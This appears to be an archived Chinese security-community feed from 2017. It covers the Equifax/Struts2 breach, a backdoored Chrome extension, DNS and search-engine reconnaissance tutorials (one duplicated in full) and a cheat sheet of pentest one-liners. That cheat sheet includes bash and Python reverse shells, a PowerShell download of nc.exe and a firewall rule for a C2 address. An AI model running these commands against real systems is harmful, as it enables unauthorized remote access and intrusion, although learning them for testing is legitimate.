最近美国 Equifax 被黑导致 1.43 亿美国用户数据泄露，说是 Struts2 的锅（S2-052那个）。

纽约时报问：未来你如何有能力保护自己的隐私？
答案很简单：不能...

不过还是给了些好建议。当然，这远远不够。

在个人隐私保护方面，颠覆性的产品或服务在哪呢？其实上条分享已经让我意识到了点什么。

<img src="https://images.xiaomiquan.com/FnPT_EIf0_JVc2a7O3LzwZTrCsQO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:xnTNSz9AfzZ-HA2Dq5LR2NdOlMw=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-12:

Google 的 Safe Browsing 保护了全球 30 亿设备，这真是一件了不起的事。除了 Google 众多产品（包括 Chrome），还不知不觉植入了 Safari、Firefox 等产品里...

大体量做大事，但不是所有大体量的公司都能做到这种水平。


[http://security.googleblog.com/2017/09/safe-browsing-protecting-more-than-3_11.html](http://security.googleblog.com/2017/09/safe-browsing-protecting-more-than-3_11.html)



<img src="https://images.xiaomiquan.com/Fuqhpvyl8ezxgCI6AQzmCCYKSQCM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:UADkvaAO9g9hwAqQTRPDeKMECQg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FpZONfnuDB_ymBoodjVW-eZkN8Bc?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:caegFnhzXRGzW66OCf1YYH9EE8E=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-11:

> 匿名用户 提问：
cos大大新手求指导cSploit的大部分功能能够用kali自带的工具复现不？能不能举个栗子，实在不熟kali的工具哇


可以，了解好 ethercap、arpspoof 等命令，你读读 cSploit 源码，就会发现它底层也是基于这些命令。还可以进一步了解 bettercap、responder 这些。

至于每个命令工具怎么用，网上教程多，自己摸索也行。



...

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: @


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-10:


__#经验#__

  手工逆 Chrome 扩展后门的一些思路

基于昨晚发的那个 Chrome 扩展后门事件，刚刚写了篇小文，供大家参考：


[手工逆 Chrome 扩展后门的一些思路](http://mp.weixin.qq.com/s/h7m7-luE4nW_utaZhUrKEA)

 

玩进去的，欢迎交流。

<img src="https://images.xiaomiquan.com/FikpJYlbDmOLoYuCT6f432ejN6Yp?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o5OqM2gGj4WByaaxNq5FhrTA6Co=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fjjd5-5HgUBmutFJUuy4MkZn9axE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7ZVNRvAMSnNfcM9VeL0EJjBH7l4=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-10:


__#基础#__

 被动信息收集之搜索引擎
上次我们介绍了dns的信息收集之区域传输和字典爆破，这次我来介绍关于信息收集之搜索引擎方面的内容
1、
首先，来介绍下搜索引擎能做什么
 ①：收集要渗透的公司的新闻动态
 ②：重要的雇员信息，比如这个雇员是那个大佬，他的职务，所掌握的信息
 ③：机密文档/网络拓扑：有些公司的机密文档是放在公网上的，但是隐藏了，但是会被强大的搜索引擎扫出来
 ④：用户名和密码：有些用户名密码是默认的，这就可以通过搜索引擎查找，比如某品牌的摄像头设置了默认密码，就可以通过搜索引擎查看这个品牌的默认密码，也有一些密码可能被别人脱裤啦，放到了网上，我们也可以查到，然后利用撞库尝试密码
 ⑤：目标系统的技术架构：搜集你要渗透的公司的技术架构，用的是什么软硬件，什么版本，有什么已经公开的漏洞

介绍完了，接下来开始介绍搜索几种引擎：
一、shodan:
   shodan是一款功能强大的搜索引擎，但是它不爬取网页信息，只爬去各种网路设备，例如http、ftp、ssh、telent等
   地址：
[https://www.shodan.io](https://www.shodan.io)


1、
   常见filiter:
      net:192.168.1.1(指定要搜索的地址)
      country:CN、US、JP（将搜索结果限定在某个国家）
      city:beijing
      port:80
      os:windows/linux
      hostname:kali
      server:apache
以上是常见的fliter，当然，这么强大的搜索引擎怎么可能只有这么少的filiter,大家可以在搜索框旁边的explore,点进去看看别人是怎么写filiter的

2、更加详细的用法在下面这个链接：
     
[http://www.freebuf.com/sectool/121339.html](http://www.freebuf.com/sectool/121339.html)



二、google:
要说google是世界上最好的搜索引擎我想是没有异议的，用好google进行信息收集也是一名安全从业人员的基本功，下面介绍google

1、基本使用：+支付 -充值（要支付，不要充值） 
	                支付 充值（支付&&充值）
                       “ 支付 充值”（只含 “支付 充值”这个字段）
	                 intitle:电子商务
	                 intext（正文）
	                 site:搜索的站点
	                 inurl:contact(网址中含有电话的)
    	                 filetype:pdf(搜索pdf文件)
同样的，强大的google也不会局限于简单的filiter,大家也可以通过下面的网址学习别人的filiter是怎么写的,这个链接就是google hacking，当然也有其他的hacking,例如baidu hacking、bing hacking等，这个大家自行探索
	      
[https://www.exploit-db.com/google-hacking-database/](https://www.exploit-db.com/google-hacking-database/)


今天的介绍就到这里了，下一次我会将剩下的被动信息收集的内容进行收尾，在介绍一个n合一的工具：maltegoce,还有简单好用的thehavarester



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-09:


__#后门#__

  关注下这个：

[大家注意了 Chrome 的插件 User-Agent Switcher 是个木马 - V2EX](https://www.v2ex.com/t/389340)





...

<img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 我来补个图😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/f7/9a/f79af1bde651a9dd2c989af5ff7daef5802563815d9456228954484c65760e60.jpg" width="25px"/> __岳锦文__: 😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个后门太经典了：Canvas图片隐写+ES6语法糖+几个偏门技巧+多层混淆+变量加花。逆起来都眼花，不过确实吻合后门性质。

<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 之前调试产品的时候，莫名其妙的发现很多http请求，当时也是调试了很久才定位到是浏览器插件的问题，后来把Crx文件抓出来分析，代码都整理好了，有些代码混淆了没认真研究，就没发现恶意代码，原来是藏图片里了，哈哈，学习了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 看来以后要多注意这些莫名请求了😄


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-09-09:


__#姿势#__

 解读下弦哥从新加坡HITB黑客大会进口过来的黑魔法命令吧。
 虽然都比较简单，但是在一些应用场景下简直就像把简单螺丝刀变成瑞士军刀了。
黑魔法命令
一、BASH
1.将一个分区通过ssh加密通道压缩传输到10.10.10.10 设备上
dd if=/dev/rdisk0s1s2 bs=65536 conv=noerror,sync | ssh -C user@10.10.10.10 "cat >/tmp/image.dd"
2.验证指定IP的端口服务是否一直在开通状态，每隔一秒刷新一次，如果端口开通，则输出Service is up。
while (true)；do nc -vv -z -w3 10.10.10.10 80 > /dev/null && echo -e "Service is up"; sleep 1;done
3.创建一个反弹shell到指定的ip上。
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
4.用系统自带base64做编码解码处理，很方便。
echo ‘Hello, World!' | base64
把 ‘Hello, World’ 字符串做base64编码

echo 'XXXXXXXX' | base64 -d
将编码后的字符串‘XXXXXXX’ 做解码
也可以先输入base64 -d 然后输入要解码的字符，再按Ctrl+d 进行解码
5.克隆一个网站到本地，比如 wget -r -mH www.baidu.com
wget -r -mH $URL

6.根据文件名从指定路径中寻找包含特定字符串的文件，并将包含该字符串的行和该文件名输出。
find /PATH/TO/DIRECTORY -name "filename" -type f -exec grep -i "STRING" {} \； -print 2>/dev/null
7.呵呵，这个是用ccat查看文件内容时，给一些代码中特殊字符加上颜色，看代码方便很多。
alias ccat='pygmentize -O bg=dark,style=colorful'
8.查看自己的公网IP
curl -4 icanhazip.com
wget -qO- ifconfig.me/ip
补充两个
curl ipinfo.io
curl ip.cn
9.多聪明的命令，给自己的上一条命令自动加上sudo,并命一个简短的别名，是不是经常忘记输入sudo，这下世界美丽了不少吧。
alias gah='sudo $(history -p \!\!)'

二、CMD KUNG-FU
1.这个命令用于用电脑的无线网卡创建一个无线热点，不过要看你的网卡是不是支持承载网络，不支持的话就没办法建立热点。
netsh wlan set hostednetwork mode=allow ssid=<MYSSID> key=<MYPASSWORD> && netsh wlan start hostednetwork

netsh wlan drivers 可以查看网卡支不支持承载网络。
2.Windows下的端口转发，可以支持v4tov4、v4tov6、v6tov6、v6tov4，windows自带的，很方便。
netsh interface protproxy add v4tov6 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<PORT> connectaddress=<RHOST>
3.查询指定IP或者端口的连接，并每秒刷新一次。
netstat -naob 1 | find "<IPADDR or PORT>"
4.获取正在运行进程的一些详细信息。
wmic process list full
5.显示每个进程对应的服务。
tasjkust /svc

三、PowerShell
1.用ping命令去扫描整个C段
1..255 | % {echo "192.168.253.$_"; ping -n 1 -w 100 192.168.253.$_} | Select-String ttl
补充个cmd的
for /L %i in (1,1,255) do @ping 192.168.253.%i -n 1 -w 100 | find /i "ttl"
2. 从http服务器下载文件保存到本地
Win 7:   (New-Object System.Net.Webclient).DownloadFile("
[http://10.10.10.10/nc.exe","c:](http://10.10.10.10/nc.exe","c:)

\nc.exe")
Win8 and later:  wget "
[http://10.10.10.10/nc.exe"](http://10.10.10.10/nc.exe")

 -outfile "c:\nc.exe"
3.查看Windows内置防火墙的规则，非常详细，各个程序入站出站的规则和端口等详细信息都有。
Get-NetFirewallRule -all | Out-GridView

Get-NetFIrewallRule -all | Export-csv <filename.csv>
将查询结果导出到一个csv文件中
4.给Windows内置防火墙增加一条准许的规则。Win7 测试无法用，Win10 可以。
New-NetFIrewallRule -Action Allow -DisplayName Pentester-C2 -Remoteaddress <IPADDR>
5.用powershell来端口扫描
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
扫描一个IP范围是否开放指定端口
foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.253.$ip}
设定IP范围和端口范围进行扫描(速度比较慢)
1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
6.从指定目录的文件中寻找文件内容包含STRING字符的文件，并显示该行内容和文件名。一般用于查询记录的密码和配置了。
ls -r c:\PATH\DIRECTORY file | % {Select-String -path $_ -pattern STRING}

四、python
1.开启一个简易的HTTP服务器，很方便有没有。
python 2.x
python -m SimpleHTTPServer 8000
python 3.x
python3 -m http.server 8000
2.用python从HTTP服务器来下载文件，或者是整站的页面。
python 2.x
python -c 'import urllib2; print urllib2.urlopen("
[http://10.10.10.10](http://10.10.10.10)

").read()' | tee /tmp/file.html
python 3.x
python3 -c 'import urllib.request;urllib.request.urlretrieve("
[http://10.10.10.10](http://10.10.10.10)

","/tmp/10.10.10.html")'
3.将一个反弹回来或是漏洞利用得到的shell转换为一个类似终端的shell。这样shell就可以交互了。
python -c 'import pty;pty.spawn("/bin/bash")'
4.用python创建一个反弹shell，类似nc。Windows和Linux通用
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('<IPADDR>',<PORT>))\nwhile 1: proc =
subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

资源推荐:

[https://pen-testing.sans.org/blog/category/command-line-kung-fu](https://pen-testing.sans.org/blog/category/command-line-kung-fu)

   (命令都是来自这家安全培训公司，他们网站上有命令演示，和每个参数的详解，感兴趣可以去看看，需自己爬出去)

[https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888](https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888)

  (PowerShell作者出的教程视频，中文字幕、中文字幕、中文字幕)


__分享文件:__
[黑魔法命令.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞这样的解读啊😘

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞

<img src="https://file.xiaomiquan.com/85/7e/857e7074cd57069c52c64361162a16153347497cda25cad85d234445a06ef8b2.jpg" width="25px"/> __愤怒CPU__: mark😏


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-08:

> Cris 提问：
如何爬取网站搜索栏自动补全的内容，给个思路，先行谢谢。比如我在google内搜索iPhone 7 y 就会有4个自动补全内容。前两个为 iPhone 7 adapter / iPhone 7 youtube。 说得比较啰嗦，谢谢。


你可以通过 Chrome 开发者工具抓包观察请求来了解本质，比如我输入 cos，在请求里看到如下链接：

[https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t](https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t)



内容是：
["cos",[["costco",0,[131]],["cos",0],["cosco",0],["costco ca",0,[131]]],{"j":"o5","k":1,"q":"ZEhkkVJAyiprdmxZvBP4Zy70OOx","t":{"bpc":false,"phi":0,"tlw":false}}]

也就是说这个是 AJAX 动态返回的 JSON 数据，这就是自动补全的内容。

那么后面的爬虫就简单了，你完全可以考虑用 PhantomJS 或 Headless Chrome 来应对这种动态 AJAX 内容。

思路如此，更多自己调试走起。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补上自动补全内容的一张图：

<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 好的，谢谢，现在自己做电商公司，深感爬虫的重要性，拿别人的不靠谱，一是因为定制化，二是因为需求更新。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 一般都自己写，不会很难

<img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 然而爬虫是一个很长的产业链，一旦进入就必然与反爬做斗争，还有打码、动态代理...

<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__ replies to <img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__: 是的，没错，到最后都是拼团队，拼资源


...

---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-06:


__#基础#__

被动信息收集之dns区域传输，dns爆破

上一篇介绍了域名信息以及相关的记录和nslookup,接下来介绍另一种信息收集的方法   接上一次的介绍，我说到了一个东西，叫dns查询方式，但是没有展开说，dns查询采用的是递归查询，怎么个递归法呢，我找了一个链接比较详细

 
[DNS递归查询新手入门了解 DNS,DNS递归查询 - 鸿网互联[68IDC.CN]](http://www.68idc.cn/help/opersys/windowsserver2003/2013041829024.html)



可能看了不懂，没关系，我们接下来通过一个工具进行了解，下面介绍工具:
 DIG

 dig命令和nslookup有很多相似的地方，但是dig比nslookup功能强大许多

 一、
     基本使用：
               dig www.sina.com any(查找所有记录，不用加-type) @8.8.8.8(指定dns服务器)
     基本参数：+noall：不显示任何结果，一般配合其他参数使用。
                      +answer:只显示结果。
                      -x:反向解析 dig -x 192.168.1.1（反向查询：查询ptr记录）
                      配合使用：dig +noall +answer .......（除了结果什么都不显示）
二、利用dig查询并进行抓包
	通过执行基本命令 ：
                      dig sina.com +trace
        进行域名追踪并通过wireshark进行抓包，可以了解到dns递归查询是怎样查询的，并且通过抓包，可以发现是否有人对dns服务器进行劫持，把域名解析到恶意网站，具体要自己抓过才能才知道。一定要自己抓，不能偷懒！
	贴一个网址详细一点：
[DNS信息收集-DIG - 含笑 - CSDN博客](http://blog.csdn.net/qq_33936481/article/details/51424577)



        但是呢，dig 不能查询一个域名下的所有记录，但是做渗透测试，我们想知道一个dns服务器下的所有记录，但是如何获得一个域名服务器下的所有记录呢？

  1、利用dig查询bind版本，通过查询bind版本信息（dns的bind版本）查看存在的漏洞，对dns服务器进行攻击，进而取得所有的记录，但是经过我努力，一般看不到bind版本信息

     基本命令：dig +noall +answer txt chaos(类) VERSION.BIND @ns3.dnsv4.com
这个命令的意思是：查询txt记录，他是chaos类，一般查的ns,cname,a记录都是inter类，可以通过抓包看包内容查看记录是什么类，后面接的表示查询bind版本，@后接要查的dns服务器
  2、dns区域传输：（配合抓包）
	利用dns之间的同步机制（一台dns服务器上的变更可以同步到其他的服务器，一般区域传输至存在于本地dns服务器上，如果管理员配置错误，就有可能让人访问到所有的记录），首先利用nslookup或者dig查询域名下的dns服务器，还是配合抓包，了解原理，而不是了解工具使用
	常见命令：
	 1、 dig @ns1.example.com example.com axfr(区域传输的方法：差异化传输) #一般不会成功，除非配置错误
	 2、host -T (使用TCP）-l（采用axfr传输） sina.com ns3.sina.com（host命令没有深入了解，我一般只是配合使用）

         
[host命令_Linux host 命令用法详解：常用的分析域名查询工具](http://man.linuxde.net/host)

（这个网址大家可以看下参数配置，熟悉命令的使用）

   3、dns字典爆破：一般区域传输都不会成功，特别是大型网站，所以介绍几个常用的dns字典爆破工具，原理就是向dns服务器发送查询，如果有这个记录，就会返回结果，反之不返回，利用这个原理进行暴力破解。一般选一个顺手的就行，也可以每个都试试，不同的工具爆破的速度，字典的质量不同，也可以把每个工具下的字典组合起来，生成一个自己的专有字典，下面是几个常见的工具，太多，不详细介绍，大家使用-h看具体参数操作，一定要亲自尝试，实践才最牛
	fierce -dnsserver 192.168.1.1 -dns sina.com.cn -wordlist a.txt 
	dnsdict6 -d4 -t 16(使用线程数) -x sina.com（这个比较好，速度也快）
	dnsenum -f dnsbig.txt  -dnsserver 8.8.8.8 sina.com -o sina.txt
	dnsmap sina.com -w dns.txt
	dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt
	dnsrecon -t std -d sina.com
这次的介绍就到这里了，介绍了那么多，还是推荐大家一定要抓包，看这些包是怎么发送和接受的，里面有什么，不要局限于工具的使用，下次我将介绍被动信息收集的
之利用搜索引擎进行信息收集部分



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 问一下 nslookup 有如下这种用法吗？
nslookup 随机字符串 target-ip

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没试过这种用法，你的随机字符串是？

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 就是从一段字符串中随机选择其中的一段子字符串

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没有哇，我查过man手册没有这种用法

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 必须要安利一下小菜我弄的脚本了😆 
[https://github.com/bit4woo/Teemo](https://github.com/bit4woo/Teemo)




...

---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-06:


__#基础#__

被动信息收集之dns区域传输，dns爆破

上一篇介绍了域名信息以及相关的记录和nslookup,接下来介绍另一种信息收集的方法   接上一次的介绍，我说到了一个东西，叫dns查询方式，但是没有展开说，dns查询采用的是递归查询，怎么个递归法呢，我找了一个链接比较详细

 
[DNS递归查询新手入门了解 DNS,DNS递归查询 - 鸿网互联[68IDC.CN]](http://www.68idc.cn/help/opersys/windowsserver2003/2013041829024.html)



可能看了不懂，没关系，我们接下来通过一个工具进行了解，下面介绍工具:
 DIG

 dig命令和nslookup有很多相似的地方，但是dig比nslookup功能强大许多

 一、
     基本使用：
               dig www.sina.com any(查找所有记录，不用加-type) @8.8.8.8(指定dns服务器)
     基本参数：+noall：不显示任何结果，一般配合其他参数使用。
                      +answer:只显示结果。
                      -x:反向解析 dig -x 192.168.1.1（反向查询：查询ptr记录）
                      配合使用：dig +noall +answer .......（除了结果什么都不显示）
二、利用dig查询并进行抓包
	通过执行基本命令 ：
                      dig sina.com +trace
        进行域名追踪并通过wireshark进行抓包，可以了解到dns递归查询是怎样查询的，并且通过抓包，可以发现是否有人对dns服务器进行劫持，把域名解析到恶意网站，具体要自己抓过才能才知道。一定要自己抓，不能偷懒！
	贴一个网址详细一点：
[DNS信息收集-DIG - 含笑 - CSDN博客](http://blog.csdn.net/qq_33936481/article/details/51424577)



        但是呢，dig 不能查询一个域名下的所有记录，但是做渗透测试，我们想知道一个dns服务器下的所有记录，但是如何获得一个域名服务器下的所有记录呢？

  1、利用dig查询bind版本，通过查询bind版本信息（dns的bind版本）查看存在的漏洞，对dns服务器进行攻击，进而取得所有的记录，但是经过我努力，一般看不到bind版本信息

     基本命令：dig +noall +answer txt chaos(类) VERSION.BIND @ns3.dnsv4.com
这个命令的意思是：查询txt记录，他是chaos类，一般查的ns,cname,a记录都是inter类，可以通过抓包看包内容查看记录是什么类，后面接的表示查询bind版本，@后接要查的dns服务器
  2、dns区域传输：（配合抓包）
	利用dns之间的同步机制（一台dns服务器上的变更可以同步到其他的服务器，一般区域传输至存在于本地dns服务器上，如果管理员配置错误，就有可能让人访问到所有的记录），首先利用nslookup或者dig查询域名下的dns服务器，还是配合抓包，了解原理，而不是了解工具使用
	常见命令：
	 1、 dig @ns1.example.com example.com axfr(区域传输的方法：差异化传输) #一般不会成功，除非配置错误
	 2、host -T (使用TCP）-l（采用axfr传输） sina.com ns3.sina.com（host命令没有深入了解，我一般只是配合使用）

         
[host命令_Linux host 命令用法详解：常用的分析域名查询工具](http://man.linuxde.net/host)

（这个网址大家可以看下参数配置，熟悉命令的使用）

   3、dns字典爆破：一般区域传输都不会成功，特别是大型网站，所以介绍几个常用的dns字典爆破工具，原理就是向dns服务器发送查询，如果有这个记录，就会返回结果，反之不返回，利用这个原理进行暴力破解。一般选一个顺手的就行，也可以每个都试试，不同的工具爆破的速度，字典的质量不同，也可以把每个工具下的字典组合起来，生成一个自己的专有字典，下面是几个常见的工具，太多，不详细介绍，大家使用-h看具体参数操作，一定要亲自尝试，实践才最牛
	fierce -dnsserver 192.168.1.1 -dns sina.com.cn -wordlist a.txt 
	dnsdict6 -d4 -t 16(使用线程数) -x sina.com（这个比较好，速度也快）
	dnsenum -f dnsbig.txt  -dnsserver 8.8.8.8 sina.com -o sina.txt
	dnsmap sina.com -w dns.txt
	dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt
	dnsrecon -t std -d sina.com
这次的介绍就到这里了，介绍了那么多，还是推荐大家一定要抓包，看这些包是怎么发送和接受的，里面有什么，不要局限于工具的使用，下次我将介绍被动信息收集的
之利用搜索引擎进行信息收集部分



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 问一下 nslookup 有如下这种用法吗？
nslookup 随机字符串 target-ip

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没试过这种用法，你的随机字符串是？

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 就是从一段字符串中随机选择其中的一段子字符串

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没有哇，我查过man手册没有这种用法

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 必须要安利一下小菜我弄的脚本了😆 
[https://github.com/bit4woo/Teemo](https://github.com/bit4woo/Teemo)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-06:


__#漏洞#__

  S2-052 这个漏洞影响面应该有限，目前来看限制条件两个：

1.使用了rest 这个插件；
2.使用xml数据来传输。

可以优先排查自己是否如此，如果是如此，那影响会很严重。还有及时升级新版总不会错。


[S2-052 - Apache Struts 2 Documentation - Apache So...](https://cwiki.apache.org/confluence/display/WW/S2-052)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 
[GitHub - mbechler/marshalsec](https://github.com/mbechler/marshalsec)


这个生成攻击Payload的项目不错

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: S2-053都出来了~


...

---

